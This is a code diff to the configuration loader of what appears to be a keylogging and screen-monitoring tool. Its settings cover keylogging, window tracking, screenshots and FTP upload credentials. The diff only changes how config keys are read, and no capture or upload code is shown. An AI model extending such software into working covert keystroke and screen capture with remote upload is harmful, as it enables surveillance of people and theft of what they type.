@@ -37,22 +37,22 @@ class Configuration:
                 print('Config.json loaded!')
             except Exception:
                 self.__setDefault()
-                pass
+                print('Default loaded!')
 
 
 
     def __setConfig(self, config:dict):
             self.__debug = config['debug']
-            self.__keyloggingIsActive = config['keyloggingIsActive'.lower()]
-            self.__windowTrackingIsActive = config['windowTrackingIsActive'.lower()]
-            self.__samplingFrequency = config['samplingFrequency'.lower()]
-            self.__screenshotFrequency = config['screenshotFrequency'.lower()]
-            self.__screenshotTrigger = config['screenshotTrigger'.lower()]
-            self.__baseURL = config['baseURL'.lower()]
-            self.__communicationFrequency = config['communicationFrequency'.lower()]
-            self.__ftpURL = config['ftpURL'.lower()]
-            self.__ftpUserName = config['ftpUserName'.lower()]
-            self.__ftpPassword = config['ftpPassword'.lower()]
+            self.__keyloggingIsActive = config['keyloggingIsActive']
+            self.__windowTrackingIsActive = config['windowTrackingIsActive']
+            self.__samplingFrequency = config['samplingfrequency']
+            self.__screenshotFrequency = config['screenshotfrequency']
+            self.__screenshotTrigger = config['screenshottrigger']
+            self.__baseURL = config['baseurl']
+            self.__communicationFrequency = config['communicationfrequency']
+            self.__ftpURL = config['ftpurl']
+            self.__ftpUserName = config['ftpusername']
+            self.__ftpPassword = config['ftppassword']
 
 
 
